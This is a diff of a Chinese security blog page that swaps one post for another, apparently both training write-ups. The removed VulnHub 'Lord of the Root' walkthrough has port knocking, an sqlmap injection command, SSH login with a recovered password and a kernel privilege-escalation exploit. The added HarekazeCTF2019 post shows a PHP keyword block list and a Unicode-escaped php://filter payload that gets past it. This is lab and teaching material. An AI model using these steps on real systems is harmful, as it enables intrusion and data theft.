@@ -13,7 +13,7 @@
         name="viewport"
         content="width=device-width, initial-scale=1, maximum-scale=1"
       />
-      <title>Lord-Of-The-Root-1-0-1 |  n0rt6&#39;s blog</title>
+      <title>BUUCTF-WEB之[HarekazeCTF2019]encode_and_encode |  n0rt6&#39;s blog</title>
   <meta name="generator" content="hexo-theme-ayer">
       
       <link rel="shortcut icon" href="/favicon.jpg" />
@@ -59,7 +59,7 @@
     <main class="content on">
       <section class="outer">
   <article
-  id="post-Lord-Of-The-Root-1-0-1"
+  id="post-BUUCTF-WEB之-HarekazeCTF2019-encode-and-encode"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -70,7 +70,7 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  Lord-Of-The-Root-1-0-1
+  BUUCTF-WEB之[HarekazeCTF2019]encode_and_encode
 </h1>
  
 
@@ -78,11 +78,11 @@
     </header>
      
     <div class="article-meta">
-      <a href="/2023/09/11/Lord-Of-The-Root-1-0-1/" class="article-date">
-  <time datetime="2023-09-10T16:03:02.000Z" itemprop="datePublished">2023-09-11</time>
+      <a href="/2023/12/13/BUUCTF-WEB%E4%B9%8B-HarekazeCTF2019-encode-and-encode/" class="article-date">
+  <time datetime="2023-12-13T12:43:10.000Z" itemprop="datePublished">2023-12-13</time>
 </a> 
   <div class="article-category">
-    <a class="article-category-link" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a>
+    <a class="article-category-link" href="/categories/ctf/">ctf</a>
   </div>
   
 <div class="word_count">
@@ -90,7 +90,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">731</span>
+            <span class="post-count">409</span>
         </span>
     </span>
 
@@ -99,7 +99,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">2 分钟</span>
+            <span class="post-count">1 分钟</span>
         </span>
     </span>
 </div>
@@ -116,52 +116,70 @@
        
   <meta name="referrer" content="no-referrer"/>
 
-<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>1、靶机下载地址：<a target="_blank" rel="noopener" href="https://download.vulnhub.com/lordoftheroot/LordOfTheRoot_1.0.1.ova">https://download.vulnhub.com/lordoftheroot/LordOfTheRoot_1.0.1.ova</a> 2、涉及知识点： &gt;1、端口碰撞 &gt;2、内核提权（Ubuntu14.04版本） &gt;3、UDF提权</p>
-<h2 id="靶机知识点记录"><a href="#靶机知识点记录" class="headerlink" title="靶机知识点记录"></a>靶机知识点记录</h2><p>使用nmap探测之后发现靶机只开放了22（ssh）端口？？什么玩意儿。。。 在尝试ssh登录时发现一部分内容： <img src="https://img-blog.csdnimg.cn/090fe71b8b45414dbf63b1f3f996bf28.png" alt="45"> 看到了easy as 1，2，3。 以前也没遇到过，再查看别人的打靶记录之后发现原来是关于<strong>端口碰撞（Port Knocking）技术</strong>的知识点。</p>
+<h2 id="HarekazeCTF2019-encode-and-encode"><a href="#HarekazeCTF2019-encode-and-encode" class="headerlink" title="[HarekazeCTF2019]encode_and_encode"></a>[HarekazeCTF2019]encode_and_encode</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">function</span> <span class="token function-definition function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token variable">$banword</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
+    <span class="token comment">// no path traversal</span>
+    <span class="token string single-quoted-string">'\.\.'</span><span class="token punctuation">,</span>
+    <span class="token comment">// no stream wrapper</span>
+    <span class="token string single-quoted-string">'(php|file|glob|data|tp|zip|zlib|phar):'</span><span class="token punctuation">,</span>
+    <span class="token comment">// no data exfiltration</span>
+    <span class="token string single-quoted-string">'flag'</span>
+  <span class="token punctuation">]</span><span class="token punctuation">;</span>
+  <span class="token variable">$regexp</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$banword</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/i'</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$regexp</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token variable">$body</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$json</span> <span class="token operator">=</span> <span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token variable">$body</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$body</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token variable">$json</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+  <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$content</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"&lt;p>not found&lt;/p>\n"</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+  <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;p>invalid request&lt;/p>'</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token comment">// no data exfiltration!!!</span>
+<span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/HarekazeCTF\&#123;.+\&#125;/i'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span> <span class="token operator">=></span> <span class="token variable">$content</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$body</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//PHP 输入流中获取请求的主体内容</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$body</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token variable">$json</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+  <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$content</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"&lt;p>not found&lt;/p>\n"</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+  <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;p>invalid request&lt;/p>'</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <blockquote>
-<p>端口碰撞是一种通过在一组预先指定的关闭端口上产生连接请求，从外部打开防火墙上的端口的方法。如果收到正确的连接请求序列，防火墙规则就会被动态更改，从而允许连接请求的主机通过特定端口进行连接。如果不是按照特定的端口序列进行请求，那么受保护的端口就会关闭。</p>
+<p>if判断有三个条件：<br>1、检测传入的内容是否合法也就是<code>is_valid()</code>，传入的内容里面不能含有非法字符，但是没有过滤filter协议<br>2、传入的格式就是json格式<br>3、传入的参数就是page<br>三个条件同时满足的话就会通过<code>file_get_contents</code>得到该文件</p>
 </blockquote>
-<p>靶机这个意思应该就是要按照端口1、2、3的序列进行连接尝试。之后打开受保护的端口。 <strong>端口碰撞方法</strong></p>
-<ul>
-<li>1 knock命令</li>
-</ul>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/HarekazeCTF\&#123;.+\&#125;/i'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment">//这里不绕过的话flag会被覆盖掉，因此使用filter伪协议来绕过（将内容进行base64加密后flag就不会被覆盖了）</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>因为要读取flag文件，但是<code>is_valid()</code>函数将flag和php都过滤了，所以这里还有一个知识点就是:</p>
 <blockquote>
-<p>konck 192.168.206.144 1 2 3 -v</p>
+<p>php的json_decode在遇到unicode编码时会自动把它转换成正常的字符</p>
 </blockquote>
-<ul>
-<li>2 nmap命令</li>
-</ul>
-<blockquote>
-<p>按次序进行指定端口扫描即可</p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/7130abec22004654add004cd8a88ed15.png" alt="2"></p>
-<p>之后再使用nmap探测。 后面在找到登录页面之后尝试进行sql注入。 普通的方式进行SQLmap注入扫描没找到，使用sqllmap进行针对表单的注入:</p>
-<blockquote>
-<p>sqlmap -o -u <a target="_blank" rel="noopener" href="http://192.168.206.144:1337/978345210/index.php">http://192.168.206.144:1337/978345210/index.php</a> –forms –dbs</p>
-</blockquote>
-<p>在拿到账号密码之后使用ssh登录靶机</p>
-<blockquote>
-<p>ssh <a href="mailto:&#115;&#x6d;&#x65;&#x61;&#103;&#x6f;&#x6c;&#x40;&#x31;&#x39;&#x32;&#46;&#x31;&#x36;&#x38;&#x2e;&#x32;&#x30;&#x36;&#46;&#x31;&#x34;&#52;">&#115;&#x6d;&#x65;&#x61;&#103;&#x6f;&#x6c;&#x40;&#x31;&#x39;&#x32;&#46;&#x31;&#x36;&#x38;&#x2e;&#x32;&#x30;&#x36;&#46;&#x31;&#x34;&#52;</a> MyPreciousR00t</p>
-</blockquote>
-<p>登录之后当然要开始收集信息进行提权了，查看系统版本</p>
-<blockquote>
-<p>uname -a Linux LordOfTheRoot 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015 i686 i686 i686 GNU&#x2F;Linux</p>
-</blockquote>
-<p>也可以给靶机上传一个信息收集文件 本机使用python开启一个http服务</p>
-<blockquote>
-<p>python -m http.server</p>
-</blockquote>
-<p>靶机下载文件</p>
-<blockquote>
-<p>wget <a target="_blank" rel="noopener" href="http://192.168.206.1:8000/linux-exploit-suggester.sh">http://192.168.206.1:8000/linux-exploit-suggester.sh</a> chmod 777 linux-exploit-suggester.sh .&#x2F;linux-exploit-suggester.sh</p>
-</blockquote>
-<p>收集一波之后发现可以使用脏牛提权，但是试了几次都把靶机搞坏了，换一种方法吧。 我使用的多的信息收集工具是<strong>linpeas.sh</strong>。 好了先使用内核提权搜索Ubuntu14.04版本提权漏洞 找到一个<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/39166">CVE-2015-8660</a></p>
-<p>下载之后执行以下命令就行</p>
-<blockquote>
-<p>gcc 39166.c -o dayu chmod 777 czy .&#x2F;dayu</p>
-<p>提权成功 <img src="https://img-blog.csdnimg.cn/58e4f735e80748d499a4ac198f5ae0fb.png" alt="1"> 之前使用linpeas.sh收集信息时发现还有个地方有问题 <img src="https://img-blog.csdnimg.cn/d8c77bb96f4c484586bcd00c0c8e223e.png" alt="1"> 在root目录下发现还有一个python文件switcher.py文件，内容与3个door文件有关，这里涉及缓冲区溢出的问题，有时间再看。 然后还有一种提权方法就是<strong>UDF提权</strong> 直接用的exp：</p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/a1a2a7ff0ac242e8a35747b3d27ce149.png" alt="12"></p>
+<p>那么将<code>php://filter/read=convert.base64-encode/resource=/flag</code>进行<a target="_blank" rel="noopener" href="https://tool.chinaz.com/tools/unicode.aspx">Unicode编码</a><br><img src="https://img-blog.csdnimg.cn/direct/b5998a581da445da9c4c4a1a7cecc9f3.png" alt="789"><br><img src="https://img-blog.csdnimg.cn/direct/2b057cfdc190400485cb62914ac1568c.png" alt="789"><br>然后将flag进行解码。</p>
  
       <!-- reward -->
       
@@ -232,30 +250,23 @@
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://3143047748.github.io/2023/09/11/Lord-Of-The-Root-1-0-1/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://3143047748.github.io/2023/12/13/BUUCTF-WEB%E4%B9%8B-HarekazeCTF2019-encode-and-encode/" alt="微信分享二维码">
     </div>
 </div>
 
 <div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/buuctf/" rel="tag">buuctf</a></li></ul>
+
     </footer>
   </div>
 
    
   <nav class="article-nav">
     
-      <a href="/2023/10/06/NewStarCTF-2023/" class="article-nav-link">
-        <strong class="article-nav-caption">上一篇</strong>
-        <div class="article-nav-title">
-          
-            NewStarCTF-2023
-          
-        </div>
-      </a>
     
-    
-      <a href="/2023/09/05/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022/" class="article-nav-link">
+      <a href="/2023/12/13/BUUCTF-WEB%E4%B9%8B-SWPUCTF-2018-SimplePHP/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">羊城杯2022</div>
+        <div class="article-nav-title">BUUCTF-WEB之[SWPUCTF 2018]SimplePHP</div>
       </a>
     
   </nav>
